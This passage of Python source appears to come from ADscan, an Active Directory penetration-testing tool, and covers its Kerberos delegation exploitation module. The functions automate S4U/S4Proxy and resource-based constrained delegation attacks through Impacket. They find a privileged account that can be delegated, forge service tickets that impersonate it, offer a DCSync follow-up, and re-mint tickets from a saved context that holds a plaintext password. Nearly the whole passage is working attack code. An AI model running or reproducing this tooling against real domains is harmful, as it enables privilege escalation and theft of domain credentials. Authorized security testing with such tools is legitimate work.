            s4u_password=s4u_password,
        )

        if result.success:
            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"Forwardable ticket created successfully for domain {marked_domain}"
            )
            return True

        print_error(
            "Error creating forwardable ticket. Check logs for detailed information."
        )
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error creating forwardable ticket.")
        print_exception(show_locals=False, exception=e)
        return False


def launch_s4proxy(
    shell: DelegationShell,
    domain: str,
    target: str,
    username: str,
    password: str,
    *,
    prompt_for_dcsync_followup: bool = True,
) -> bool:
    """Launch the S4Proxy attack with the forwardable ticket."""
    from adscan_internal.services.exploitation import ExploitationService

    setattr(shell, "_last_delegation_launch_result", None)
    try:
        # Get a privileged user that can be delegated
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            setattr(
                shell,
                "_last_delegation_launch_result",
                {
                    "success": False,
                    "target_spn": target,
                    "target_user": None,
                    "ticket_path": None,
                    "error": "No privileged user found that can be delegated",
                },
            )
            print_error("No privileged user found that can be delegated")
            return False

        auth = shell.build_auth_impacket_no_host(username, password, domain)
        service = ExploitationService()
        additional_ticket = (
            f"{target_user}@browser_{shell.domains_data[domain]['pdc_hostname']}"
            f".{domain}@{domain.upper()}.ccache"
        )
        build_result = service.delegation.build_s4proxy_command(
            impacket_scripts_dir=shell.impacket_scripts_dir,
            target_user=target_user,
            target_spn=target,
            additional_ticket=additional_ticket,
            dc_ip=shell.domains_data[domain]["pdc"],
            auth=auth,
        )
        if not build_result.success or not build_result.command:
            setattr(
                shell,
                "_last_delegation_launch_result",
                {
                    "success": False,
                    "target_spn": target,
                    "target_user": target_user,
                    "ticket_path": None,
                    "error": str(
                        build_result.error_message or "Error executing S4Proxy."
                    ),
                },
            )
            print_error(str(build_result.error_message or "Error executing S4Proxy."))
            return False

        print_success("Launching S4Proxy")
        result = service.delegation.run_service_ticket_command(
            command=build_result.command,
            timeout=300,
            impacket_context=_build_impacket_context(shell),
            kerberos_retry_context=_build_impacket_kerberos_retry_context(
                shell,
                domain=domain,
                username=username,
                credential=password,
            ),
        )

        if result.success:
            ticket = result.ticket_path
            setattr(
                shell,
                "_last_delegation_launch_result",
                {
                    "success": True,
                    "target_spn": target,
                    "target_user": target_user,
                    "ticket_path": ticket,
                },
            )

            print_success("S4Proxy executed successfully")
            if ticket and prompt_for_dcsync_followup:
                shell.ask_for_dcsync(domain, target_user, ticket)
            elif not ticket:
                print_warning(
                    "S4Proxy completed but could not parse ticket path from output."
                )
            return True

        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": False,
                "target_spn": target,
                "target_user": target_user,
                "ticket_path": None,
                "error": str(result.error_message or "").strip()
                or "S4Proxy execution failed",
            },
        )
        print_error(
            f"Error executing S4Proxy: {result.error_message or 'unknown error'}"
        )
        return False

    except Exception as e:
        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": False,
                "target_spn": target,
                "target_user": None,
                "ticket_path": None,
                "error": str(e),
            },
        )
        telemetry.capture_exception(e)
        print_error("Error executing S4Proxy.")
        print_exception(show_locals=False, exception=e)
        return False


def request_delegated_service_ticket(
    shell: DelegationShell,
    domain: str,
    target_spn: str,
    username: str,
    password: str,
    *,
    force_forwardable: bool = True,
) -> bool:
    """Request a delegated service ticket directly via getST.py.

    This is the preferred path for RBCD against computer targets. Unlike the
    legacy S4Proxy wrapper, it does not depend on an intermediate browser/DC
    ccache and instead asks Impacket directly for the final service ticket.
    """
    from adscan_internal.services.exploitation import ExploitationService

    previous_result = getattr(shell, "_last_delegation_launch_result", None)
    aggregated_ticket_paths: dict[str, str] = {}
    if isinstance(previous_result, dict):
        raw_previous_paths = previous_result.get("ticket_paths")
        if isinstance(raw_previous_paths, dict):
            aggregated_ticket_paths = {
                str(key).strip(): str(value).strip()
                for key, value in raw_previous_paths.items()
                if str(key).strip() and str(value).strip()
            }

    setattr(shell, "_last_delegation_launch_result", None)
    setattr(
        shell,
        "_last_delegation_launch_context",
        {
            "domain": domain,
            "target_spn": target_spn,
            "target_spns": sorted({*aggregated_ticket_paths.keys(), target_spn}),
            "username": username,
            "password": password,
            "force_forwardable": force_forwardable,
        },
    )
    try:
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            setattr(
                shell,
                "_last_delegation_launch_result",
                {
                    "success": False,
                    "target_spn": target_spn,
                    "ticket_paths": aggregated_ticket_paths,
                    "target_user": None,
                    "ticket_path": None,
                    "error": "No privileged user found that can be delegated",
                },
            )
            print_error("No privileged user found that can be delegated")
            return False

        auth = shell.build_auth_impacket_no_host(username, password, domain)
        service = ExploitationService()
        build_result = service.delegation.build_service_ticket_command(
            impacket_scripts_dir=shell.impacket_scripts_dir,
            target_user=target_user,
            target_spn=target_spn,
            auth=auth,
            dc_ip=shell.domains_data[domain]["pdc"],
            force_forwardable=force_forwardable,
        )
        if not build_result.success or not build_result.command:
            error_message = str(
                build_result.error_message or "Error requesting delegated service ticket."
            )
            setattr(
                shell,
                "_last_delegation_launch_result",
                {
                    "success": False,
                    "target_spn": target_spn,
                    "ticket_paths": aggregated_ticket_paths,
                    "target_user": target_user,
                    "ticket_path": None,
                    "error": error_message,
                },
            )
            print_error(error_message)
            return False

        marked_spn = mark_sensitive(target_spn, "service")
        print_success(
            f"Requesting delegated service ticket for {marked_spn}"
        )
        result = service.delegation.run_service_ticket_command(
            command=build_result.command,
            timeout=300,
            impacket_context=_build_impacket_context(shell),
            kerberos_retry_context=_build_impacket_kerberos_retry_context(
                shell,
                domain=domain,
                username=username,
                credential=password,
            ),
        )
        if result.success and result.ticket_path:
            aggregated_ticket_paths[target_spn] = result.ticket_path
        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": result.success,
                "target_spn": target_spn,
                "target_user": target_user,
                "ticket_path": result.ticket_path,
                "ticket_paths": aggregated_ticket_paths,
                "error": result.error_message,
            },
        )
        if result.success:
            print_success("Delegated service ticket created successfully")
            return True

        print_error(
            str(result.error_message or "Error requesting delegated service ticket.")
        )
        return False

    except Exception as e:
        setattr(
            shell,
            "_last_delegation_launch_result",
            {
                "success": False,
                "target_spn": target_spn,
                "ticket_paths": aggregated_ticket_paths,
                "target_user": None,
                "ticket_path": None,
                "error": str(e),
            },
        )
        telemetry.capture_exception(e)
        print_error("Error requesting delegated service ticket.")
        print_exception(show_locals=False, exception=e)
        return False


def refresh_last_delegated_service_ticket(
    shell: DelegationShell,
    *,
    current_ticket_path: str | None = None,
) -> str | None:
    """Recreate the most recent delegated service ticket and return its new path.

    This is used by NetExec recovery logic when a delegated SMB session fails
    with ``STATUS_MORE_PROCESSING_REQUIRED`` and ADscan still has the context
    needed to mint a fresh ticket.
    """
    context = getattr(shell, "_last_delegation_launch_context", None)
    if not isinstance(context, dict):
        print_warning(
            "ADscan cannot refresh this delegated ticket automatically because "
            "the original delegation context is no longer available."
        )
        return None

    previous_result = getattr(shell, "_last_delegation_launch_result", None)
    previous_ticket_path = None
    previous_ticket_paths: dict[str, str] = {}
    if isinstance(previous_result, dict):
        previous_ticket_path = str(previous_result.get("ticket_path") or "").strip() or None
        raw_ticket_paths = previous_result.get("ticket_paths")
        if isinstance(raw_ticket_paths, dict):
            previous_ticket_paths = {
                str(key).strip(): str(value).strip()
                for key, value in raw_ticket_paths.items()
                if str(key).strip() and str(value).strip()
            }

    requested_ticket_path = str(current_ticket_path or "").strip() or None
    known_ticket_paths = {
        os.path.abspath(path)
        for path in ([previous_ticket_path] if previous_ticket_path else [])
        if path
    }
    known_ticket_paths.update(
        os.path.abspath(path) for path in previous_ticket_paths.values() if path
    )
    if requested_ticket_path and known_ticket_paths and os.path.abspath(
        requested_ticket_path
    ) not in known_ticket_paths:
        print_warning(
            "ADscan detected a delegated ticket mismatch and will not refresh "
            "an unrelated Kerberos cache automatically."
        )
        return None

    domain = str(context.get("domain") or "").strip()
    target_spn = str(context.get("target_spn") or "").strip()
    raw_target_spns = context.get("target_spns")
    if isinstance(raw_target_spns, list):
        target_spns = [str(item).strip() for item in raw_target_spns if str(item).strip()]
    else:
        target_spns = [target_spn] if target_spn else []
    username = str(context.get("username") or "").strip()
    password = str(context.get("password") or "")
    force_forwardable = bool(context.get("force_forwardable", True))

    if not domain or not target_spns or not username or not password:
        print_warning(
            "ADscan cannot refresh this delegated ticket because the saved "
            "delegation context is incomplete."
        )
        return None

    for next_target_spn in target_spns:
        marked_spn = mark_sensitive(next_target_spn, "service")
        print_info(
            "Refreshing delegated service ticket for "
            f"{marked_spn}."
        )
        success = request_delegated_service_ticket(
            shell,
            domain,
            next_target_spn,
            username,
            password,
            force_forwardable=force_forwardable,
        )
        if not success:
            return None

    refreshed_result = getattr(shell, "_last_delegation_launch_result", None)
    if not isinstance(refreshed_result, dict):
        return None
    refreshed_ticket_paths = refreshed_result.get("ticket_paths")
    if requested_ticket_path and isinstance(refreshed_ticket_paths, dict):
        previous_match = None
        for spn, prior_path in previous_ticket_paths.items():
            if os.path.abspath(str(prior_path)) == os.path.abspath(requested_ticket_path):
                previous_match = str(spn).strip()
                break
        if previous_match:
            refreshed_match = str(refreshed_ticket_paths.get(previous_match) or "").strip()
            if refreshed_match:
                return refreshed_match
    return str(refreshed_result.get("ticket_path") or "").strip() or None
